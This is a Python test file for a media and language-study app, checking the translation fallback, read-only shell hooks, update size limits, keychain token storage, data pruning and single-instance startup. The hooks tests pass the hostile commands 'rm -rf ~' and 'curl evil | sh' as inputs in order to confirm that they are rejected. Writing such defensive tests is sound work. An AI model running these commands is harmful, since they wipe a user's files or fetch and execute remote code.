"""Audit decisions, patch C: security, data retention and startup robustness (behaviour;
audit 71Б rewrite). Window checks run the real index.html (tests/page_harness.py)."""

from __future__ import annotations

import hashlib
import json
import os
import re
import time
import zipfile
from pathlib import Path
from types import SimpleNamespace

import pytest

from pudge import study_secrets
from pudge.config import AppConfig, CONFIG_WARNINGS, load_config, write_config
from pudge.database import Database
from pudge.light_novels import LightNovelService
from pudge.web_app import WebAppApi
from study_page_support import LN_BOOK, SELECTION
from tests.i18n_support import en, ru


def _ln(tmp_path: Path) -> LightNovelService:
    cfg = AppConfig()
    cfg.library.database_path = tmp_path / "db.sqlite3"
    cfg.library.root_dir = tmp_path / "library"
    cfg.paths.cache_dir = tmp_path / "cache"
    cfg.library.root_dir.mkdir(parents=True, exist_ok=True)
    cfg.paths.cache_dir.mkdir(parents=True, exist_ok=True)
    return LightNovelService(cfg)


class FakeKeychain:
    available = True

    def __init__(self):
        self.items: dict[str, str] = {}
        self.reads = 0

    def get(self, account):
        self.reads += 1
        return self.items.get(account, "")

    def set(self, account, value):
        self.items[account] = value
        return True

    def delete(self, account):
        self.items.pop(account, None)


# -------------------------------------------------------- 25. Google fallback


def test_google_fallback_can_be_turned_off(tmp_path, monkeypatch):
    service = _ln(tmp_path)
    service.config.llm.enabled = True
    monkeypatch.setattr(
        service, "_translate_local_llm", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("ollama down"))
    )
    sent = []
    monkeypatch.setattr(service, "_translate_online", lambda text, target: sent.append(text) or "online")
    assert service.settings().translation_google_fallback is True
    assert service.translate_selection("猫", "前の文", media_id=None)["provider"] == "google"
    service.save_settings({"translation_google_fallback": False})
    with pytest.raises(Exception, match="Local translation failed"):
        service.translate_selection("犬", "前の文", media_id=None)
    assert sent == ["猫"]


def test_translation_popover_says_when_google_translated(page):
    for lang in ("en", "ru"):
        result = page.run(
            SELECTION
            + r"""
            await __settle(openLightNovel(6)); await __tick(300);
            const translate = async index => {
              await selectParagraph(index); await press('[data-pudge-translate-now]'); await __tick(20);
              return {text: __text('#pudgeTranslationPop .pudge-translation-text'),
                      source: document.querySelector('#pudgeTranslationPop .pudge-translation-source')?.innerText ?? null};
            };
            window.PROVIDER = 'google';
            const google = await translate(0);
            window.PROVIDER = 'llm';
            return {google, local: await translate(1), expected: t('reading.translatedByGoogle')};
            """,
            lang=lang,
            before=LN_BOOK
            + "__api.translate_text = async text => ({translation: 'T:' + text, provider: window.PROVIDER});",
            state={"settings": {"review_gate_ln_enabled": False}},
        )
        out = result.value
        assert out["google"] == {"text": "T:猫が好きだ。", "source": out["expected"]}
        assert out["local"] == {"text": "T:犬も好きだ。", "source": None}
    assert en("reading.translatedByGoogle") == "Translated by Google"
    assert ru("reading.translatedByGoogle") == "Переведено Google"


def test_google_fallback_switch_is_saved_from_settings(page):
    result = page.run(
        r"""
        setPage('settings', true); await __tick(100);
        const box = $('s_ln_translation_google'), shown = box.checked;
        box.checked = false; box.dispatchEvent(new Event('change', {bubbles: true}));
        await __click('#saveSettings'); await __tick(50);
        return shown;
        """,
        state={"settings": {"ln_translation_google_fallback": True}},
    )
    assert result.value is True
    assert [call[0]["ln_translation_google_fallback"] for call in result.calls_of("save_settings")] == [False]


# ------------------------------------------------------------- 26. hooks


def test_shell_hooks_cannot_be_changed_or_run_from_the_web_api(tmp_path, monkeypatch):

    api = WebAppApi.__new__(WebAppApi)
    api.config = AppConfig()
    api.config.nyaa.pre_search_command = "echo safe"
    api.logger = SimpleNamespace(warning=lambda *a, **k: None, info=lambda *a, **k: None)
    captured = {}

    class Nyaa:
        def __init__(self, *_a, **kwargs):
            captured.update(kwargs)
            self.proxy_url = ""
            self.proxy_mode = "direct"

        def search(self, _query):
            return []

    monkeypatch.setattr("pudge.web_app.NyaaClient", Nyaa)
    api.test_nyaa_proxy({"search_hook": "rm -rf ~"})
    assert captured["pre_search_command"] == "echo safe"
    # Settings saved from the window cannot change them either.
    path = tmp_path / "config.toml"
    config = AppConfig()
    config.config_path = path
    config.library.database_path = tmp_path / "library.sqlite3"
    config.paths.cache_dir = tmp_path / "cache"
    config.nyaa.pre_search_command = "echo search"
    config.qbittorrent.pre_download_command = "echo download"
    write_config(config, path)
    saved = WebAppApi(path).save_settings({"search_hook": "rm -rf ~", "download_hook": "curl evil | sh"})
    assert (saved["settings"]["search_hook"], saved["settings"]["download_hook"]) == (
        "echo search",
        "echo download",
    )
    reloaded = load_config(path)
    assert (reloaded.nyaa.pre_search_command, reloaded.qbittorrent.pre_download_command) == (
        "echo search",
        "echo download",
    )


def test_settings_show_shell_hooks_read_only_and_never_send_them(page):
    result = page.run(
        r"""
        setPage('settings', true); await __tick(100);
        const hooks = ['s_search_hook', 's_download_hook'].map(id => ({value: $(id).value, readOnly: $(id).readOnly}));
        await __input('#s_search_hook', 'rm -rf ~');
        await __click('#saveSettings'); await __tick(50);
        return hooks;
        """,
        state={"settings": {"search_hook": "echo search", "download_hook": "echo download"}},
    )
    assert result.value == [
        {"value": "echo search", "readOnly": True},
        {"value": "echo download", "readOnly": True},
    ]
    [[saved]] = result.calls_of("save_settings")
    assert not [key for key in saved if "hook" in key]


# ------------------------------------------------------------- 29. updater


def test_update_archive_size_limits(tmp_path, monkeypatch):
    from pudge import updater

    archive = tmp_path / "release.zip"
    with zipfile.ZipFile(archive, "w") as bundle:
        bundle.writestr("pudge/install.sh", "#!/bin/sh\n")
        bundle.writestr("pudge/pyproject.toml", 'version = "9.9.9"\n')
    assert updater.AppUpdater._extract_archive(archive, tmp_path / "ok", "9.9.9").name == "pudge"
    monkeypatch.setattr(updater, "MAX_UPDATE_EXTRACTED_BYTES", 10)
    with pytest.raises(updater.UpdateError, match="unexpected size"):
        updater.AppUpdater._extract_archive(archive, tmp_path / "big", "9.9.9")
    monkeypatch.setattr(updater, "MAX_UPDATE_ARCHIVE_ENTRIES", 1)
    with pytest.raises(updater.UpdateError, match="too many files"):
        updater.AppUpdater._extract_archive(archive, tmp_path / "many", "9.9.9")


def test_update_download_stops_at_the_size_limit(tmp_path, monkeypatch):
    from pudge import updater

    class Response:
        def __init__(self, length, chunks):
            self.headers = {"Content-Length": str(length)} if length is not None else {}
            self.chunks = chunks

        def raise_for_status(self):
            pass

        def iter_bytes(self):
            yield from self.chunks

    def serve(response):
        class Stream:
            def __enter__(self):
                return response

            def __exit__(self, *_exc):
                return False

        monkeypatch.setattr(updater.httpx, "stream", lambda *_a, **_k: Stream())

    monkeypatch.setattr(updater, "MAX_UPDATE_DOWNLOAD_BYTES", 10)
    app = updater.AppUpdater()
    serve(Response(6, [b"abc", b"def"]))
    assert (
        app._download("https://example.test/u.zip", tmp_path / "ok.zip")
        == hashlib.sha256(b"abcdef").hexdigest()
    )
    # An announced size over the limit is refused before anything is written ...
    serve(Response(11, [b"x" * 11]))
    with pytest.raises(updater.UpdateError, match=re.escape(en("error.web.updateTooLarge"))):
        app._download("https://example.test/u.zip", tmp_path / "announced.zip")
    assert not (tmp_path / "announced.zip").exists()
    # ... and a body without (or with a wrong) size stops once it passes the limit.
    serve(Response(None, [b"x" * 6, b"x" * 6, b"x" * 6]))
    with pytest.raises(updater.UpdateError, match=re.escape(en("error.web.updateTooLarge"))):
        app._download("https://example.test/u.zip", tmp_path / "streamed.zip")
    assert (tmp_path / "streamed.zip").stat().st_size <= 10


# ----------------------------------------------------- 30. tokens in Keychain


def test_study_tokens_move_to_the_keychain_and_are_read_once(tmp_path, monkeypatch):
    keychain = FakeKeychain()
    monkeypatch.setattr(study_secrets, "_STORE", keychain)
    study_secrets.forget_cache()
    service = _ln(tmp_path)
    conn = service._connect()
    try:
        conn.execute("INSERT INTO ln_settings(key,value) VALUES('jiten_api_key','legacy-jiten')")
        conn.commit()
    finally:
        conn.close()
    assert service.settings().jiten_api_key == "legacy-jiten"
    assert keychain.items == {"ln-jiten-api-key": "legacy-jiten"}
    conn = service._connect()
    try:
        assert conn.execute("SELECT value FROM ln_settings WHERE key='jiten_api_key'").fetchone()[0] == ""
    finally:
        conn.close()
    service.save_settings({"jpdb_api_token": "new-jpdb"})
    assert keychain.items["ln-jpdb-api-token"] == "new-jpdb"
    reads = keychain.reads
    for _ in range(5):
        settings = service.settings()
    assert (settings.jiten_api_key, settings.jpdb_api_token) == ("legacy-jiten", "new-jpdb")
    assert keychain.reads == reads  # cached per process
    service.save_settings({"jiten_api_key": ""})
    assert "ln-jiten-api-key" not in keychain.items and service.settings().jiten_api_key == ""
    study_secrets.forget_cache()


def test_without_a_keychain_tokens_stay_in_sqlite(tmp_path, monkeypatch):
    monkeypatch.setattr(study_secrets, "_STORE", SimpleNamespace(available=False))
    study_secrets.forget_cache()
    service = _ln(tmp_path)
    service.save_settings({"jiten_api_key": "plain"})
    assert service.settings().jiten_api_key == "plain"


# --------------------------------------------------------- 31. retention


def test_history_older_than_five_days_is_pruned_but_current_choices_stay(tmp_path):
    db = Database(tmp_path / "db.sqlite3")
    now = time.time()
    old = now - 10 * 86400
    with db.connect() as conn:
        for created, status in ((old, "selected"), (old + 1, "rejected"), (now, "rejected")):
            conn.execute(
                "INSERT INTO subtitle_history(video_path,status,created_at) VALUES('/v/1.mkv',?,?)",
                (status, created),
            )
        conn.execute(
            "INSERT INTO subtitle_history(video_path,status,created_at) VALUES('/v/2.mkv','selected',?)",
            (old,),
        )
        conn.execute(
            "INSERT INTO subtitle_history(video_path,status,created_at) VALUES('/v/2.mkv','selected',?)",
            (old + 5,),
        )
        for hash_, episode, at in (("a", 1, old), ("b", 1, old + 1), ("c", 2, old), ("d", 3, now)):
            conn.execute(
                "INSERT INTO release_history(info_hash,episode,title,selected_at) VALUES(?,?,'t',?)",
                (hash_, episode, at),
            )
        conn.execute(
            "INSERT INTO episode_state_history(video_path,from_state,to_state,created_at) VALUES('/v/1.mkv','a','b',?)",
            (old,),
        )
        conn.execute("INSERT INTO state(key,value,updated_at) VALUES('playback_save:v1:x','{}',?)", (old,))
        conn.execute("INSERT INTO state(key,value,updated_at) VALUES('playback_save:v1:y','{}',?)", (now,))
        conn.execute("INSERT INTO state(key,value,updated_at) VALUES('other','{}',?)", (old,))
    removed = db.prune_history(now=now)
    with db.connect() as conn:
        subtitle = [
            (r[0], r[1]) for r in conn.execute("SELECT video_path,status FROM subtitle_history ORDER BY id")
        ]
        releases = sorted(r[0] for r in conn.execute("SELECT info_hash FROM release_history"))
        keys = sorted(r[0] for r in conn.execute("SELECT key FROM state"))
    # Video 1: the old selected choice (latest selected) and the new row stay; the old rejected one goes.
    assert subtitle == [("/v/1.mkv", "selected"), ("/v/1.mkv", "rejected"), ("/v/2.mkv", "selected")]
    # Episode 1 keeps its latest release (b); episode 2 its only one (c).
    assert releases == ["b", "c", "d"]
    assert "playback_save:v1:x" not in keys and "playback_save:v1:y" in keys and "other" in keys
    assert removed["episode_state_history"] == 1


def test_daily_prune_also_removes_debug_jsonl_and_old_migration_backups(tmp_path):
    from test_v0730_acquisition_safety import manager_for

    manager = manager_for(tmp_path)
    debug = Path(manager.config.paths.cache_dir) / "subtitle-debug"
    debug.mkdir(parents=True)
    stale, fresh = debug / "old.jsonl", debug / "new.jsonl"
    stale.write_text("{}")
    fresh.write_text("{}")
    os.utime(stale, (time.time() - 6 * 86400,) * 2)
    database = Path(manager.config.library.database_path)
    for index in range(4):
        backup = database.with_name(f"{database.name}.pre-v{index}.backup")
        backup.write_text("x")
        os.utime(backup, (time.time() - 100 + index,) * 2)
    removed = manager.prune_history_if_due()
    assert removed["subtitle_debug_files"] == 1 and fresh.exists() and not stale.exists()
    assert sorted(path.name for path in database.parent.glob("*.backup")) == [
        f"{database.name}.pre-v2.backup",
        f"{database.name}.pre-v3.backup",
    ]
    assert manager.prune_history_if_due() == {}  # once a day


# ------------------------------------------------------ 33. content keys


def test_renaming_an_audiobook_keeps_its_transcript(tmp_path):
    from pudge.audiobooks import AudiobookService

    service = AudiobookService(
        Database(tmp_path / "db.sqlite3"),
        ffprobe="ffprobe",
        ffmpeg="ffmpeg",
        mpv="mpv",
        cache_dir=tmp_path / "cache",
    )
    audio = tmp_path / "book.m4b"
    audio.write_bytes(os.urandom(2 * 1024 * 1024))
    rows = [{"file_index": 0, "path": str(audio), "start": 0.0, "end": 100.0}]
    service._file_rows = lambda _book: rows
    before = service._transcript_fingerprint(1)
    legacy_before = service._transcript_fingerprint(1, legacy=True)
    renamed = tmp_path / "renamed.m4b"
    audio.rename(renamed)
    rows[0]["path"] = str(renamed)
    service._fingerprint_cache.clear()
    assert service._transcript_fingerprint(1) == before
    assert service._transcript_fingerprint(1, legacy=True) != legacy_before


def test_path_keyed_transcript_is_adopted_under_the_content_key(tmp_path):
    from pudge.audiobooks import AudiobookService

    service = AudiobookService(
        Database(tmp_path / "db.sqlite3"),
        ffprobe="ffprobe",
        ffmpeg="ffmpeg",
        mpv="mpv",
        cache_dir=tmp_path / "cache",
    )
    audio = tmp_path / "book.m4b"
    audio.write_bytes(os.urandom(300 * 1024))
    service._file_rows = lambda _book: [{"file_index": 0, "path": str(audio), "start": 0.0, "end": 10.0}]
    legacy = service._legacy_transcript_path_v3(1)
    legacy.parent.mkdir(parents=True, exist_ok=True)
    legacy.write_text(
        json.dumps({"schema": "audiobook-stt-v3", "segments": [{"start": 0, "end": 1, "text": "猫"}]})
    )
    payload = service._load_transcript(1)
    assert payload and payload["segments"][0]["text"] == "猫"
    assert service._transcript_path(1).is_file() and service._transcript_path(1) != legacy


# ---------------------------------------------------------- 34. log rotation


def test_only_the_window_rotates_the_shared_log(tmp_path, monkeypatch):
    import logging
    from logging.handlers import RotatingFileHandler, WatchedFileHandler

    from pudge import logging_utils

    logger = logging.getLogger("pudge")
    saved = list(logger.handlers)
    try:
        for handler in saved:
            logger.removeHandler(handler)
        logging_utils.set_log_rotation_owner(False)
        logging_utils.configure_logging(tmp_path / "agent.log")
        assert any(isinstance(h, WatchedFileHandler) for h in logger.handlers)
        logging_utils.set_log_rotation_owner(True)
        logging_utils.configure_logging(tmp_path / "gui.log")
        assert any(isinstance(h, RotatingFileHandler) for h in logger.handlers)
    finally:
        for handler in list(logger.handlers):
            if handler not in saved:
                logger.removeHandler(handler)
                handler.close()
        for handler in saved:
            if handler not in logger.handlers:
                logger.addHandler(handler)
        logging_utils.set_log_rotation_owner(False)


# --------------------------------------------------------- 35. one window


def test_second_window_asks_the_first_to_come_forward(tmp_path):
    from pudge import single_instance

    first = single_instance.acquire(tmp_path)
    assert first is not None
    focused = []
    assert first.serve_focus_requests(lambda: focused.append(True))
    assert single_instance.acquire(tmp_path) is None
    assert single_instance.request_focus(tmp_path)
    deadline = time.time() + 2
    while not focused and time.time() < deadline:
        time.sleep(0.01)
    assert focused == [True]
    first.release()
    again = single_instance.acquire(tmp_path)
    assert again is not None
    again.release()


def test_second_launch_brings_the_first_window_forward_without_opening_the_app(tmp_path, monkeypatch, capsys):
    from pudge import logging_utils, single_instance, web_app

    first = single_instance.acquire()
    if first is None:
        pytest.skip("another test holds the instance lock")
    focused = []
    try:
        assert first.serve_focus_requests(lambda: focused.append(True))
        monkeypatch.setattr(logging_utils, "set_log_rotation_owner", lambda _owner: None)
        monkeypatch.setattr(web_app, "_set_macos_runtime_identity", lambda: None)
        # The second launch must not even build the API (database, session markers).
        monkeypatch.setattr(
            web_app, "WebAppApi", lambda *_a, **_k: pytest.fail("a second window was started")
        )
        assert web_app.launch_web_app(tmp_path / "config.toml") == 0
        deadline = time.time() + 2
        while not focused and time.time() < deadline:
            time.sleep(0.01)
        assert focused == [True]
        assert "is already running; its window was brought to the front." in capsys.readouterr().out
    finally:
        first.release()


# ------------------------------------------------------- config errors


def test_config_typos_warn_and_use_defaults(tmp_path):
    path = tmp_path / "config.toml"
    path.write_text(
        '[agent]\nenabled = "false"\ntorrent_poll_minutes = "12O"\n[ui]\nreview_gate_count = "7"\n[library]\ndisk_limit_gb = "abc"\n'
    )
    config = load_config(path)
    assert config.agent.enabled is False
    assert config.agent.poll_minutes == 10
    assert config.ui.review_gate_count == 7
    assert config.library.disk_limit_gb == 500.0
    assert any("torrent_poll_minutes" in message for message in CONFIG_WARNINGS)
    assert any("disk_limit_gb" in message for message in CONFIG_WARNINGS)
